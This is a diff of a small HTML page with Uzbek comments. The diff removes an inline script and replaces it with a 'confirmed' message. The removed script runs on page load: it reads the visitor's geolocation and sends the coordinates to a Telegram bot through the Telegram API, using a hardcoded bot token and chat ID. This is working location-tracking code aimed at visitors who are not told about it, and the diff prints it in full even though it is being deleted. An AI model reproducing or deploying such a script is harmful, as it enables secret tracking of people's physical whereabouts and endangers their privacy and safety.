@@ -4,51 +4,6 @@
     <title>sayt</title>
 </head>
 <body>
-
-<script>
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            console.log('Latitude:', latitude);
-            console.log('Longitude:', longitude);
-            
-            // Telegram bot tokenini o'zgartiring
-            var bot_token = '6610663507:AAFU2KClCniP88c2whxIZr-nrT_6Ijuk93g';
-            // Foydalanuvchi ID'sini o'zgartiring
-            var chat_id = '5990121283';
-            
-            // Telegram bot orqali geolokatsiya kordinatalarini yuborish
-            var url = 'https://api.telegram.org/bot' + bot_token + '/sendLocation';
-            var data = {
-                chat_id: chat_id,
-                latitude: latitude,
-                longitude: longitude
-            };
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Telegram bot response:', data);
-            })
-            .catch(error => {
-                console.error('There was a problem with your fetch operation:', error);
-            });
-        });
-    } else {
-        console.log('Geolocation is not supported by this browser.');
-    }
-</script>
-
+<p>tasdiqlandi....</p>
 </body>
 </html>
